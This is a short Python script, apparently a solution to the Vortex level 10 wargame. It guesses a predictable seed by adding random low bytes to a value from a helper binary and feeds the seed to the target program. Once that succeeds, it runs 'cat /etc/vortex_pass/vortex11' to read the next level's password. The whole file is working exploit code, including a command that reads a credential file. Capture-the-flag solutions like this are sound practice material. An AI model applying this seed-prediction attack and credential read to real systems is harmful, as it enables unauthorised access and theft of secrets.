import subprocess
import random
import struct


# Run getseed.o to get the base seed
def run():
    process = subprocess.Popen(
        ["./getseed.o"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=False
    )

    output = process.stdout.readline().decode().strip()
    output = output.replace("Seed: ", "")
    return int(output)


while True:
    process = subprocess.Popen(
        ["/vortex/vortex10"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=False
    )

    outputs = process.stdout.readline().decode().strip()
    print("Program output:", outputs)

    # Process input text to int list
    outputs = outputs.replace("[", "").replace("]", "").replace(" ", "").split(",")
    outputs = [int(x, 16) for x in outputs if x]

    lower_byte = random.randint(0x00, 0xFF)
    total_seed = run() + lower_byte
    seed_bytes = struct.pack("<I", total_seed)

    process.stdin.write(seed_bytes + b"\n")
    process.stdin.write(b"cat /etc/vortex_pass/vortex11\n")
    process.stdin.flush()

    response = process.stdout.readline().decode().strip()
    print("Response:", response)
    if "Nope" not in response:
        break
